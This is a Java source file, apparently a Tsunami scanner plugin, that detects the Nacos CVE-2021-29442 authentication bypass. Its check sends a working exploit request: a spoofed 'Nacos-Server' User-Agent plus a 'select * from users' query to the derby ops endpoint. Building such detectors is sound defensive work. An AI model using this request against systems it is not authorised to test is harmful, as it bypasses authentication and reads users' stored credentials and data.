package com.google.tsunami.plugins.detectors.nacos.sqli_lte140;


import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.get;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.inject.Inject;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;

/**
 * A {@link VulnDetector} that detects the CVE-2021-29442 vulnerability.
 */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "NacosSQLIVulnDetector",
    version = "1.0",
    description = "This detector checks for Alibaba-Nacos <= 1.4.0 CVE-2021-29442 execute arbitrary SQL without authentication vulnerability.",
    author = "threedr3am (threedr3am@foxmail.com)",
    bootstrapModule = NacosSQLIVulnDetectorBootstrapModule.class
)
public class NacosSQLIVulnDetector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  NacosSQLIVulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    HttpHeaders httpHeaders = HttpHeaders.builder()
        .addHeader("User-Agent", "Nacos-Server")
        .build();
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
        + "nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20";
    try {
      HttpResponse response = httpClient.send(get(targetUri).setHeaders(httpHeaders).build(),
          networkService);
      try {
        if (response.status() != HttpStatus.OK || !response.bodyJson().isPresent()) {
          return false;
        }
        if (response.bodyJson().get().getAsJsonObject().get("code").getAsInt() == 200) {
          return true;
        }
      } catch (Throwable t) {
        logger.atInfo().log("Failed to parse cores response json");
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
    }
    return false;
  }

  public DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher("threedr3am")
                        .setValue("CVE-2021-29442"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Alibaba-Nacos User-Agent authentication bypass vulnerability (CVE-2021-29442)")
                .setDescription(
                    "When the nacos version is less than or equal to 1.4.0, "
                        + "it can be accessed without authentication and execute arbitrary SQL queries, "
                        + "which leads to the disclosure of sensitive information."
                        + "https://github.com/alibaba/nacos/issues/4463")
        )
        .build();
  }
}
